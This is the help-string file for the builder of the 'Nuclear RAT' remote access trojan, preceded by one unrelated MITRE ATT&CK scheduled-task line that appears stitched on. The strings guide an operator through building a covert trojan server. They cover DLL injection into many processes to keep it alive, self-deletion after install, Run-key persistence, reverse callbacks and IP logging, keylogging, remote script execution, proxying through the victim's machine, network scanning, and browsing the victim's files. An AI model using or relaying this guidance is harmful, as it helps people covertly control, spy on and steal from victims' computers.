T1053.long: Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system.

Help_Client_DirectConnect=You can connect to a direct connection Nuclear RAT server using this field. You can connect to multiple direct servers, just put the IP:PORT (in this format) and wait for the server answer

Help_Client_Windows=This part control all of your currently opened windows. Easier to keep track of your work. Double click to show a window. Each window have an internal control, press ESC inside the window to close it and press F1 to hide and to not lose your progress on that window
Help_Connections='This function show all the current connections in the client. You may close any connection that might be hanged or its unused, or to cut any transfer process in the client

Help_Connection_AntiBurst=This value will ping the each server separated by this interval. This is used to minimize the bandwidth used when pinging and when getting the servers to reconnect to the client. The more servers you have, the higher this value should be.
Help_Connection_AutoOpen=Setting this to TRUE, will make the client automatically listen on port when it starts!
Help_Connection_Beep=Beep when a connection is made (direct or reverse)
Help_Connection_DirPass=Set the password for your direct connection attempts. Will be ignored if the server doesnt have a password set
Help_Connection_PingInt=Set the ping interval to check for dead servers
Help_Connection_Popup=If the client is minimized to the tray, when a server connect, it will show a balloon tooltip saying which server connected and disconnected.

Help_Connection_RecvBroad=If enabled, you will be able to receive answers from unconnected servers when performing broadcast commands. If your connection isnt fast enough, its advised to keep it set to false
Help_Connection_RevPort=Port that you will open in your computer to listen for reverse servers
Help_Connection_Sound=Enable sounds for disconnection, transfer complete and transfer failed
Help_Connection_ToTray=Put the icon in system tray instead of minimizing it
Help_Connection_Tries=This will test the connections, and will close the connections after it reaches this timeout. Advised to set it higher when on slower connections.
Help_CreateServer_AssignedName=This name is used to distinguish between server groups
Help_CreateServer_Body=The body of your message. Use the char | to do a new line. Leave this field empty for no message box
Help_CreateServer_DirPort=The port where the server will listen for a direct connection

Help_CreateServer_DLL=The name of the server DLL that will be placed on the folder you specify in "Install Subfolder Path". You can specify any extension for the DLL (means, it does not need to be ".dll")
Help_CreateServer_Filename=The filename for installation. This file will be copied to the folder you specify below (in the "Install Subfolder Path" field). Must have an executable extension.

Help_CreateServer_Hybrid=The hybrid server mode will make the server work in both direct and reverse connection modes. The server will try to connect using the reverse connection parameters you specified (for reverse connection), and will listen on the port you specify as well (for direct connection)
Help_CreateServer_Icon=The icon that the message box will have

Help_CreateServer_InjectParams=Nuclear RAT server has the ability to inject its DLL to a lot of processes at once. This way you can guarantee that the server will be always running. Don't need to worry about multiple servers trying to connecting to you, since just one server at time will be enabled. If one process, that got the server injected into, crash or close, the next waiting server will take place immediatelly.
There are special modifiers for injecting the Nuclear RAT server to other processes. They are the following:

%%w\ - Specify that the target process to be executed is in the WINDOWS Folder (eg.: %%w\notepad.exe;)
%%s\ - Specify that the target process to be executed is in the SYSTEM32 Folder (eg.: %%s\rundll32.exe;)
%%pf\ - Specify that the target process to be executed is in the Program Files Folder (eg.: %%pf\Internet Explorer\iexplore.exe;)
%%i\ - Inject the server to a process that is already running (eg.: %%i\svchost.exe;)
%%db\ - Inject to default browser (will execute a n

Help_CreateServer_InstallFolder=This will be the installation subfolder where the server executable, the server dll and the plugins will be placed. The path might exist or not, and it will be created in case it does not exist. You must use the path modifiers for the installation name. The modifiers are the following:
%%w\ - Will create the subfolder on the WINDOWS directory
%%s\ - Will create a subfolder on the SYSTEM32 directory
%%pf\ - Will create a subfolder on the Program Files directory
%%a\ - Will create the folder on Application Data
Note that the path you choose will be recursively created (if you pick the path to install as "%%w\My\New\Folder\Inside\Windir", the whole path will be created automatically). The modifiers are caSe SenSiTIve.
Help_CreateServer_Interval=This interval is in minutes. The mininum value is 1. The server will retry to connect everytime this interval elapses (if not connected)

Help_CreateServer_IPDNS=The "IP or DNS" you specify on this field will be used for the reverse connection. It can be used in conjunction with the "IP via URL" feature (as a backup method). You can specify multiple DNS separating them by semicolons ;. eg: dns.domain.com;dns2.domain.com;domain3.com

Help_CreateServer_IPLogger=Complete URL pointing to the Nuclear RAT logger.php, including http://. Eg.: http://wbrb.com/logger.php. Leave this field empty if you dont intend to use it. This IP logger works for all the three kinds of servers (Reverse, Direct and Hybrid)

Help_CreateServer_IPViaURL=The "IP via URL" can supply you another method to tell servers where to connect. It emulates a connection through a dynamic name server (DNS), but reading a file containing the IP and port for connection, from a website. For further information, check the "change.php" file
Help_CreateServer_Melt=Delete the original server file when it's installed
Help_CreateServer_NonInject=This will create a non injection server, and the "Injection Parameters" will be ignored. The server DLL will be loaded by the server exe.

Help_CreateServer_Password=The password you specify in this field will be only used for direct connection mode servers. Reverse connection server mode is not affected by this setting. You may leave this field empty if you don't want to use a password.

Help_CreateServer_PluginParameter=The parameter you specify here will be sent to the plugin upon server execution. Make sure you are inputting the right values, since a wrong parameter can crash the plugin, and consequently, the server

Help_CreateServer_Plugins=In this section, you can bind Nuclear RAT server side plugins to the server, that will be dropped automatically when the server gets installed. You can also execute extensions and generic plugin types, either in the server DLL or server EXE, with a custom parameter

Help_CreateServer_Redirect=This feature allows the server to follow redirection services (in case that the URL you specified in the "IP via URL" feature is a url to a service like CJB, ShortUrl, etc). This is useful to use in case you change HTTP hostings frequently, and use a redirect service to point to your website containing the IP file.

Help_CreateServer_RevPort=Specifies the port for the reverse connection. This is the port you will be listening on the client, through the "Connection Manager" (in "Port for reverse connection" option)
Help_CreateServer_Startup=Available startup methods. It's recommended to always use the HKEY Run method, it's the most reliable method (in terms that will most likely not fail to startup)
Help_CreateServer_TestMsgbox=Show how the message box will show when the server is executed for the first time
Help_CreateServer_TitleMsg=The title of your message box

Help_Execute=This function is the direct access to the ShellExecute Windows API (check MSDN if you have no idea about what is it). Through this feature you may open protocols (like mailto:, http://), and execute custom commands, like "explore", "find", "print", "edit" (must be in english), and decide how the command will be executed, if the window will be minimized, maximized, normal, etc.
Help_Keylogger_Capture=By enabling the "Capture Clicks" option, the keylogger will include the clicks made in the remote machine on the log (and on which window)
Help_Mouse=When you press the "Get" button, you will see the text that is below the mouse cursor of the remote computer.

Help_Redirect=This function extends the SOCKS support to programs that doesn't have SOCKS support. With this, you can listen on a port for incoming connections (Input port) on the remote machine, that will connect to the Output IP and Output Port you specify. Example: you want to connect to an IRC server but don't want to use a SOCKS. So, in the Input port, you put a port that can listen on the remote computer. In the Output IP you put the DNS or IP of the IRC server, and in the Output port you put the port of the IRC server. Then, instead of connecting to the IRC server port and address, you connect to the remote computer on the Input port you specified. The connection will be overlayed using the remote connection, just like a SOCKS daemon. You may open as many redirects you want.

Help_RSR=This function is specially useful on servers that are behind LAN, and cannot be reached (connected on a port) from the outside. The Remote Service Reacher is exactly what the name says, it reaches those ports on the remote machine that cannot be reached normally.\nImagine that the remote machine IP is 12.0.0.55, and you started a SOCKS5 Daemon on port 8080, and the server is behind a LAN, a router or a firewall, and will not let you connect to it. Just put the port 8080 in the "Remote Service Port" field, and put a port for you to connect in "Local Port". When the service is established, just connect to your local IP (127.0.0.1) and the port you input in "Local Port" field. This will be exactly like if you were connecting to the remote computer directly, but with the remote computer behind a LAN, router or firewall.

Help_Scanner=This is a remote IP range scanner. Here you can use remote fast connections to execute these scans for you. The edits above are self explanative. NOTE: Dont use too many threads, or the remote computer can or lose memory or crash the client. The retrieve button will get the found IP list. The current will get the current scanning IP. Execute will start a scan. Abort will halt a current scan. Start enables the usage of the scanner and Stop disables it. NOTE: you can use port intervals in the ports edit. Specify intervals by using commas and minus sign. Eg.: 135-139,445 will scan 135, 136, 137, 138, 139, 445 on each IP in the range specified
Help_Script_Execute=Execute the script on the remote machine
Help_Script_HiddenShowing=You can execute the script hidden or showing (not applicable in case of any VBScript errors)
Help_Script_TestLocal=Test the script on your PC. You will be prompted if you really want to run it
Help_Script_VBSorBat=You can write scripts here in either batch or VBScript format

Help_SharedServer=Share Server is a unique feature that allow 2 clients to connect to one LAN server.
How does it work?
The server will create a new connection, that will reverse connect to the address you specify.
NOTE: the person that is getting the shared server wont be able to remove or close the server
NOTE 2: It's a reverse connection, so the other Nuclear RAT client must accept external connections
Help_Socks5=Enable a SOCKS5 daemon on the remote machine. If the machine can't be reached through a direct connection, use the "Remote Service Reacher" feature.

Help_WebServer=This webserver is not a regular webserver daemon. This will open a port on the remote machine and will list the drives, files and folders from the remote machine, so any file can be downloaded using your browser. If the remote machine can't be reached with a direct connection, use the "Remote Service Reacher" feature.
